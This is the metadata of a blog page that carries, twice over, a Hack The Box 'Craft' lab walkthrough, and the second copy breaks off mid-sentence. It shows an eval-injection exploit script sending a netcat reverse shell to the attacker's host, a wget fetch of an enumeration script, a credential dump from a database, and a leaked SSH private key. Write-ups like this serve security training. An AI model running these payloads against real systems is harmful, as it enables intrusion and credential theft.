<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Craft" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="My first Medium box! Didn’t think I was capable of doing it so soon haha. I saw that this box was retiring soon so I thought “why not”? Of course, I needed the help of the forums to guide me :P Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.110 craft.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ nmap -sV -sT -sC craft.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 00:11 EST Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 59.20% done; ETC: 00:11 (0:00:08 remaining) Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 91.94% done; ETC: 00:12 (0:00:00 remaining) Nmap scan report for craft.htb (10.10.10.110) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) | ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA) | 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA) |_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519) 443/tcp open ssl/http nginx 1.15.8 |_http-server-header: nginx/1.15.8 |_http-title: About | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US | Not valid before: 2019-02-06T02:25:47 |_Not valid after: 2020-06-20T02:25:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.33 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the https service, maybe we can find some information on it ? Nothing much here except for the API and the git icon on the top right. Lets first check out the API. It was a link to https://api.craft.htb/api/, hence we had to add api.craft.htb to our /etc/hosts for the page to be resolved properly. 1 2 3 $ cat /etc/hosts ... 10.10.10.110 craft.htb api.craft.htb After playing around with some of the different APIs, what caught my attention was /auth/login. Upon clicking on Execute, I was prompted for credentials. Since I did not have any credentials, I decided to put this on hold for now. Lets move on the git icon. It was a link to https://gogs.craft.htb, hence we need to modify our /etc/hosts again. 1 2 3 $ cat /etc/hosts ... 10.10.10.110 craft.htb api.craft.htb gogs.craft.htb So this website is like a private github of some sort? By clicking on Explore, we are able to list all the public repositories, users and organisations on the website. Oh we found something! There is a repository that might be related to https://api.craft.htb/api! This repository seems to contain the source code. Lets try looking around. There was an issue posted which contained the API token, but sadly was expired. In the commits history, I found some credentials! Looks like Dinesh accidentally commited his credentials and tried to cover it up haha. To check if the credentials are still valid, we returned to https://api.craft.htb/api/ and key them into the prompt for the /auth/login feature. We managed to get a valid API token! Not much can be done now so I decided to look at the source code for any vulnerabilites. Exploitation (1) On https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/api/brew/endpoints/brew.py, there was a certain section that caught my eye. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @ns.route(&#39;/&#39;) class BrewCollection(Resource): ... @auth.auth_required @api.expect(beer_entry) def post(self): &quot;&quot;&quot; Creates a new brew entry. &quot;&quot;&quot; # make sure the ABV value is sane. if eval(&#39;%s &gt; 1&#39; % request.json[&#39;abv&#39;]): return &quot;ABV must be a decimal value less than 1.0&quot;, 400 else: create_brew(request.json) return None, 201 eval was being called with input from the abv field in the sent JSON for the /brew/ route. This means that whatever python expression we enter in the abv field, it will be executed. Hm… I decided to search for how to achieve reverse shell from the eval function and I found this post on StackOverflow. When &quot;__import__(&#39;os&#39;).system(&#39;nc 10.10.XX.XX -e /bin/sh&#39;)&quot; is inputted into eval, it will cause the box to connect back to us. I used the below python script to assist in the sending of the payload. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import requests authtoken = requests.get(&#39;https://api.craft.htb/api/auth/login&#39;, auth=(&#39;dinesh&#39;, &#39;4aUh0A8PbVJxgd&#39;), verify=False).json()[&quot;token&quot;] exploit = { &#39;abv&#39;:&quot;__import__(\&#39;os\&#39;).system(\&#39;nc 10.10.XX.XX 1337 -e /bin/sh\&#39;)&quot;, &quot;brewer&quot;: &quot;string&quot;, &quot;name&quot;: &quot;string&quot;, &quot;style&quot;: &quot;string&quot;, } headers = {&#39;X-Craft-Api-Token&#39;: authtoken} print(requests.post(&#39;https://api.craft.htb/api/brew/&#39;, json=exploit, headers=headers, verify=False).content) With the script ready, we start our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... And run our exploit script. Back on our listener, we catch the connection. Wait, we are already root? 1 2 3 4 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.110] 46345 id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) There was no root.txt at /root, so what is going on? Enumeration (2) Lets try running LinEnum to get some insights. 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 wget http://10.10.XX.XX/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh ... [+] Looks like we&#39;re in a Docker container: 10:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 9:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 8:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 7:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 6:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 5:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 4:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 3:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 2:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c -rwxr-xr-x 1 root root 0 Feb 10 2019 /.dockerenv Ahh I see, we are in a Docker container. We might need to escape from it if we want to get our flags :P Looking back at the repository on https://gogs.craft.htb, there was a .gitignore. 1 2 *.pyc settings.py The settings.py seemed interesting. It was located at /opt/app/craft_api and it contained a lot of juicy information. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Flask settings FLASK_SERVER_NAME = &#39;api.craft.htb&#39; FLASK_DEBUG = False # Do not use debug mode in production # Flask-Restplus settings RESTPLUS_SWAGGER_UI_DOC_EXPANSION = &#39;list&#39; RESTPLUS_VALIDATE = True RESTPLUS_MASK_SWAGGER = False RESTPLUS_ERROR_404_HELP = False CRAFT_API_SECRET = &#39;hz66OCkDtv8G6D&#39; # database MYSQL_DATABASE_USER = &#39;craft&#39; MYSQL_DATABASE_PASSWORD = &#39;qLGockJ6G2J75O&#39; MYSQL_DATABASE_DB = &#39;craft&#39; MYSQL_DATABASE_HOST = &#39;db&#39; SQLALCHEMY_TRACK_MODIFICATIONS = False Nice we got the credentials for a mysql database service running on the box. According to the model schema found at https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/database/models.py, there is a User table containing usernames and passwords. We can modify this database testing script at https://gogs.craft.htb/Craft/craft-api/src/master/dbtest.py to dump out the table. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #!/usr/bin/env python import pymysql from craft_api import settings # test connection to mysql database connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor) try: with connection.cursor() as cursor: sql = &quot;SELECT `id`, `username`, `password` FROM `user`&quot; cursor.execute(sql) result = cursor.fetchall() for creds in result: print(creds) finally: connection.close() Running the script gave us more credentials! 1 2 3 4 python dbtest_new.py {&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;} {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;} {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;} Lets try logging in to https://gogs.craft.htb using these credentials. Only dinesh’s and gilfoyle’s credentials worked. However, in gilfoyle’s homepage I noticed another repository but was private. Looking through the repository, I found a ssh key pair at https://gogs.craft.htb/gilfoyle/craft-infra/src/master/.ssh/id_rsa user.txt I downloaded the id_rsa, which is the private key. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi 4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ 3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5 0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F 5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5 elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz 6YvpJhnN2SfJC/QftzqZK2MndJrmQ= -----END OPENSSH PRIVATE KEY----- I attempted to ssh to the box. The passphrase was ZEU3N8WNM2rh4T, which was gilfoyle’s password. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ chmod 600 id_rsa $ ssh -i id_rsa gilfoyle@craft.htb Enter passphrase for key &#39;id_rsa&#39;: Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Jan 4 12:04:33 2020 from 10.10.XX.XX gilfoyle@craft:~$ cat user.txt bbf4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (3) In gilfoyle’s private repository, there was a folder called vault. Thinking it was a name for a service, I went to search online and found this. 1 A tool for secrets management, encryption as a service, and privileged access management. In the folder, I found a script at https://gogs.craft.htb/gilfoyle/craft-infra/src/master/vault/secrets.sh 1 2 3 4 5 6 7 8 9 10 #!/bin/bash # set up vault secrets backend vault secrets enable ssh vault write ssh/roles/root_otp \ key_type=otp \ default_user=root \ cidr_list=0.0.0.0/0 Hmm… Seem like vault is being used to store ssh keys or something? Time to look at the documentation. root.txt The commands looked pretty similar. Following the Automate it section, all we have to do is create a new OTP and ssh into the box. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 vault ssh -role root_otp -mode otp root@127.0.0.1 Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed below. Enter this code in the SSH password prompt. If you install sshpass, Vault can automatically perform this step for you. OTP for the session is: f80f58e4-6ec7-dcdf-b491-f2ee66a89260 . * .. . * * * * @()Ooc()* o . (Q@*0CG*O() ___ |\_________/|/ _ \ | | | | | / | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | \_| | | | | | |\___/ |\_|__|__|_/| \_________/ Password: The password is simply just the OTP generated for the session, which is f80f58e4-6ec7-dcdf-b491-f2ee66a89260. 1 2 3 4 5 6 7 8 9 10 11 12 Password: Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Aug 27 04:53:14 2019 root@craft:~# cat root.txt 831dXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="My first Medium box! Didn’t think I was capable of doing it so soon haha. I saw that this box was retiring soon so I thought “why not”? Of course, I needed the help of the forums to guide me :P Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.110 craft.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ nmap -sV -sT -sC craft.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 00:11 EST Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 59.20% done; ETC: 00:11 (0:00:08 remaining) Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 91.94% done; ETC: 00:12 (0:00:00 remaining) Nmap scan report for craft.htb (10.10.10.110) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0) | ssh-hostkey: | 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA) | 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA) |_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519) 443/tcp open ssl/http nginx 1.15.8 |_http-server-header: nginx/1.15.8 |_http-title: About | ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US | Not valid before: 2019-02-06T02:25:47 |_Not valid after: 2020-06-20T02:25:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.33 seconds Enumeration (1) Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. As for the https service, maybe we can find some information on it ? Nothing much here except for the API and the git icon on the top right. Lets first check out the API. It was a link to https://api.craft.htb/api/, hence we had to add api.craft.htb to our /etc/hosts for the page to be resolved properly. 1 2 3 $ cat /etc/hosts ... 10.10.10.110 craft.htb api.craft.htb After playing around with some of the different APIs, what caught my attention was /auth/login. Upon clicking on Execute, I was prompted for credentials. Since I did not have any credentials, I decided to put this on hold for now. Lets move on the git icon. It was a link to https://gogs.craft.htb, hence we need to modify our /etc/hosts again. 1 2 3 $ cat /etc/hosts ... 10.10.10.110 craft.htb api.craft.htb gogs.craft.htb So this website is like a private github of some sort? By clicking on Explore, we are able to list all the public repositories, users and organisations on the website. Oh we found something! There is a repository that might be related to https://api.craft.htb/api! This repository seems to contain the source code. Lets try looking around. There was an issue posted which contained the API token, but sadly was expired. In the commits history, I found some credentials! Looks like Dinesh accidentally commited his credentials and tried to cover it up haha. To check if the credentials are still valid, we returned to https://api.craft.htb/api/ and key them into the prompt for the /auth/login feature. We managed to get a valid API token! Not much can be done now so I decided to look at the source code for any vulnerabilites. Exploitation (1) On https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/api/brew/endpoints/brew.py, there was a certain section that caught my eye. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @ns.route(&#39;/&#39;) class BrewCollection(Resource): ... @auth.auth_required @api.expect(beer_entry) def post(self): &quot;&quot;&quot; Creates a new brew entry. &quot;&quot;&quot; # make sure the ABV value is sane. if eval(&#39;%s &gt; 1&#39; % request.json[&#39;abv&#39;]): return &quot;ABV must be a decimal value less than 1.0&quot;, 400 else: create_brew(request.json) return None, 201 eval was being called with input from the abv field in the sent JSON for the /brew/ route. This means that whatever python expression we enter in the abv field, it will be executed. Hm… I decided to search for how to achieve reverse shell from the eval function and I found this post on StackOverflow. When &quot;__import__(&#39;os&#39;).system(&#39;nc 10.10.XX.XX -e /bin/sh&#39;)&quot; is inputted into eval, it will cause the box to connect back to us. I used the below python script to assist in the sending of the payload. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import requests authtoken = requests.get(&#39;https://api.craft.htb/api/auth/login&#39;, auth=(&#39;dinesh&#39;, &#39;4aUh0A8PbVJxgd&#39;), verify=False).json()[&quot;token&quot;] exploit = { &#39;abv&#39;:&quot;__import__(\&#39;os\&#39;).system(\&#39;nc 10.10.XX.XX 1337 -e /bin/sh\&#39;)&quot;, &quot;brewer&quot;: &quot;string&quot;, &quot;name&quot;: &quot;string&quot;, &quot;style&quot;: &quot;string&quot;, } headers = {&#39;X-Craft-Api-Token&#39;: authtoken} print(requests.post(&#39;https://api.craft.htb/api/brew/&#39;, json=exploit, headers=headers, verify=False).content) With the script ready, we start our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... And run our exploit script. Back on our listener, we catch the connection. Wait, we are already root? 1 2 3 4 listening on [any] 1337 ... connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.110] 46345 id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) There was no root.txt at /root, so what is going on? Enumeration (2) Lets try running LinEnum to get some insights. 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/LinEnum.sh . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 wget http://10.10.XX.XX/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh ... [+] Looks like we&#39;re in a Docker container: 10:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 9:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 8:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 7:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 6:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 5:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 4:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 3:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 2:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c 1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c -rwxr-xr-x 1 root root 0 Feb 10 2019 /.dockerenv Ahh I see, we are in a Docker container. We might need to escape from it if we want to get our flags :P Looking back at the repository on https://gogs.craft.htb, there was a .gitignore. 1 2 *.pyc settings.py The settings.py seemed interesting. It was located at /opt/app/craft_api and it contained a lot of juicy information. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Flask settings FLASK_SERVER_NAME = &#39;api.craft.htb&#39; FLASK_DEBUG = False # Do not use debug mode in production # Flask-Restplus settings RESTPLUS_SWAGGER_UI_DOC_EXPANSION = &#39;list&#39; RESTPLUS_VALIDATE = True RESTPLUS_MASK_SWAGGER = False RESTPLUS_ERROR_404_HELP = False CRAFT_API_SECRET = &#39;hz66OCkDtv8G6D&#39; # database MYSQL_DATABASE_USER = &#39;craft&#39; MYSQL_DATABASE_PASSWORD = &#39;qLGockJ6G2J75O&#39; MYSQL_DATABASE_DB = &#39;craft&#39; MYSQL_DATABASE_HOST = &#39;db&#39; SQLALCHEMY_TRACK_MODIFICATIONS = False Nice we got the credentials for a mysql database service running on the box. According to the model schema found at https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/database/models.py, there is a User table containing usernames and passwords. We can modify this database testing script at https://gogs.craft.htb/Craft/craft-api/src/master/dbtest.py to dump out the table. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #!/usr/bin/env python import pymysql from craft_api import settings # test connection to mysql database connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor) try: with connection.cursor() as cursor: sql = &quot;SELECT `id`, `username`, `password` FROM `user`&quot; cursor.execute(sql) result = cursor.fetchall() for creds in result: print(creds) finally: connection.close() Running the script gave us more credentials! 1 2 3 4 python dbtest_new.py {&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;} {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;} {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;} Lets try logging in to https://gogs.craft.htb using these credentials. Only dinesh’s and gilfoyle’s credentials worked. However, in gilfoyle’s homepage I noticed another repository but was private. Looking through the repository, I found a ssh key pair at https://gogs.craft.htb/gilfoyle/craft-infra/src/master/.ssh/id_rsa user.txt I downloaded the id_rsa, which is the private key. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi 4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ 3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5 0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F 5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5 elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz 6YvpJhnN2SfJC/QftzqZK2MndJrmQ= -----END OPENSSH PRIVATE KEY----- I attempted to ssh to the box. The passphrase was ZEU3N8WNM2rh4T, which was gilfoyle’s password. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ chmod 600 id_rsa $ ssh -i id_rsa gilfoyle@craft.htb Enter passphrase for key &#39;id_rsa&#39;: Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 The programs included with the 